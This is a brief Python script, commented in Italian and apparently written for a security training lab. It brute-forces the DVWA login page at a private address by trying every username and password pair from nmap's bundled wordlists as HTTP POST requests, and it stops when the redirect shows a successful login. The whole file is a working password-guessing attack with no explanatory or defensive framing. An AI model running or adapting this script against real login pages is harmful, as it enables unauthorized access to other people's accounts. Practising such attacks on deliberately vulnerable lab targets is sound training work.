import http.client
import urllib.parse

# Apre e legge dei file contenenti nomi e password
with open("/usr/share/nmap/nselib/data/usr.lst") as username_file, open(
    "/usr/share/nmap/nselib/data/pass.lst"
) as password_file:
    # legge le liste di nomi e psw
    user_list = [user.rstrip() for user in username_file.readlines()]
    pwd_list = [pwd.rstrip() for pwd in password_file.readlines()]

    # ciclo per la lista dei nomi = user
    for user in user_list:
        # ciclo per la lista delle password = pwd
        for pwd in pwd_list:
            pwd = pwd.rstrip()

            # Stampa l'username e la password attualmente testati
            print(user, "-", pwd)

            # Codifica i dati del payload nel formato corretto
            post_data = urllib.parse.urlencode(
                {"username": user, "password": pwd, "Login": "Submit"}
            )

            # Specifica gli header della richiesta HTTP POST
            post_headers = {
                "Content-type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml",
            }

            # Stabilisce la connessione HTTP
            conn = http.client.HTTPConnection(f"192.168.32.101", 80)

            # Invia la richiesta POST con i dati del payload
            conn.request("POST", f"/dvwa/login.php", post_data, post_headers)
            response = conn.getresponse()

            # Verifica il valore dell'header "location" nella risposta HTTP
            if response.getheader("location") == "index.php":
                # Se la login ha successo, stampa un messaggio e termina lo script
                print("Logged with", user, "", pwd)
                exit()
